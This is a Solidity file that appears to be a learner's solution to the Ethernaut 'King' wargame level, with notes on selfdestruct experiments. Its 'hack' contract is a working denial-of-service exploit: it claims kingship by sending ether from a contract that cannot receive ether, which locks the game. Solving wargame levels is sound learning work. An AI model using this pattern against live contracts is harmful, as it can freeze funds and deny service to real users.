// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable 
  {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
//______________________________________________________________________________________________________________________________________


contract hack
{
    constructor() payable 
    {
        // payable(j).transfer(msg.sender)
        (bool bool_,)= payable(0xd9145CCE52D386f254917e481eB44e9943F39138).call{value:msg.value}("");
        require(bool_,"MC fail");
    }
}










//________________________________________________________________________________________________________________________________________


// Confusion ??????????????????????????????????????????????
// After selfdestruct this contract is still it can receive ether But How & why ???????????????????

contract receive_ether_after_selfdestruct_check 
{
    constructor() payable 
    {
        (bool bool_,)= payable(0xd9145CCE52D386f254917e481eB44e9943F39138).call{value:msg.value}("");
        require(bool_,"Mc fail");
    }

    function f1(address payable adr) payable  public 
    {
        selfdestruct(payable (adr));
    }
    receive() external payable {}
}


//_____________________________________________________________________________________________________________________________________________



contract storage_after_selfdestruct
{
    bool a = true;
    bytes32 b = 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;
    bool  c = false;
    bytes32 d;
    bytes32 e = 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;
    function suicide_() payable  public 
    {
        selfdestruct(payable (tx.origin));
    }
    receive() external payable { }
}
